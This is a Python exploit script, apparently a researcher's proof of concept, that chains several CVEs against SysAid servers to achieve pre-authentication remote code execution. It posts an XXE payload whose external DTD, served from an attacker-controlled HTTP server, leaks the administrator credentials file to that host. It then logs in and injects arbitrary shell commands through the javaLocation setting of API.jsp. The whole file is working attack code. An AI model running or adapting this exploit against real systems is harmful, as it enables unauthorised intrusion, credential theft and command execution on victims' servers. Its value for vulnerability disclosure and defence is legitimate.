import requests
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', required=True, help='Target URL, e.g: http://192.168.1.1:8080/')
parser.add_argument('-l', '--attacker', dest='attacker_server', required=True, help='Attacker IP address, e.g: 192.168.1.20')
parser.add_argument('-c', '--command', dest='command', required=True, help='Command to execute, e.g: whoami')
args = parser.parse_args()
HTTPSERVER_PORT = 80

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            

        watchTowr-vs-SysAid-PreAuth-RCE-Chain.py

        (*) SysAid Pre-Auth RCE Chain
        
          - Sina Kheirkhah (@SinSinology) and Jake Knott of watchTowr (@watchTowrcyber)

        CVEs: [CVE-2025-2775, CVE-2025-2776, CVE-2025-2777, CVE-2025-2778]
"""


print(banner)



attacker_server = args.attacker_server
args.target = args.target.rstrip('/')
s = requests.Session()

xxePayload = f"""<?xml version="1.0"?>
<!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://{attacker_server}/e.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>"""
file_to_leak = r'C:\Program Files\SysAidServer\logs\InitAccount.cmd'
xxeDtd = f"""<!ENTITY % d SYSTEM "file:///{file_to_leak}">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://{attacker_server}/?e=%d;'>"> """



def second_stage(u,p):
    print(f'[+] Leaked credentials: {u}:{p}')
    login(u,p)
    execute_command(args.command)

def login(u,p):
    res = s.post(f'{args.target}/Login.jsp', data={'userName': u, 'password': p}, allow_redirects=False)
    if(res.status_code == 302):
        print('[+] Successfully logged in')
    else:
        print('[!] Failed to login, response was:')
        print(res.text)
        exit(1)
    

def execute_command(command):
    command = f'"%0a{command}%0a'
    csrf_token = grab_csrf_token()
    print('[*] Poisoning with commands')
    _data = f'{csrf_token}&updateApi=false&updateApiSettings=true&javaLocation={command}'
    res = s.post(f'{args.target}/API.jsp', data=_data, headers={'Content-Type':'application/x-www-form-urlencoded'})
    if(res.status_code != 200):
        print(f'[!] Failed to poison javaLocation, error: {res.status_code}')
    else:
        _data = f'{csrf_token}&updateApi=true&updateApiSettings=false&javaLocation={command}'
        res = s.post(f'{args.target}/API.jsp', data=_data, headers={'Content-Type':'application/x-www-form-urlencoded'})
        if(res.status_code == 200):
            print(f'[+] Commands executed successfully')
            print("[*] Done")
            exit(0)
        else:
            print(f'[!] Failed to execute command, error: {res.status_code}')

def grab_csrf_token():
    res = s.get(f'{args.target}/API.jsp', headers={'Referer':f'{args.target}/Settings.jsp'}).text
    token_match = re.search(r'(X_TOKEN\S+)".*value="(\S+)"', res)
    token = f"{token_match.group(1)}={token_match.group(2)}"
    print(f'[+] Extracted token')
    return token

def stage1():
    sleep(1.5)
    requests.post(f'{args.target}/mdm/serverurl', data=xxePayload)

done = False
class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write(xxeDtd.encode('utf-8'))

    def log_message(self, format, *args):
        pass
    def send_error(self, code, message = None, explain = None):
        global done
        if(done):
            return
        print("[*] Leaking creds...")
        admin_username, admin_password = message.split(' ')[-4:-2]
        if(admin_username == None or admin_password == None):
            print('[!] Failed to extract credentials, extract them manually from exfil.txt')
            open('exfil.txt', 'w').write(message)
            exit(1)
        admin_password = admin_password.replace('"', '')
        admin_username = admin_username.replace('"', '')
        done = True
        second_stage(admin_username, admin_password)
    
server_address = ('', HTTPSERVER_PORT)
httpd = HTTPServer(server_address, S)
try:
    t = Thread(target=stage1)
    t.daemon = True
    t.start()
    print(f'[+] Starting HTTP server on port {HTTPSERVER_PORT}')
    httpd.serve_forever()
except KeyboardInterrupt:
    pass

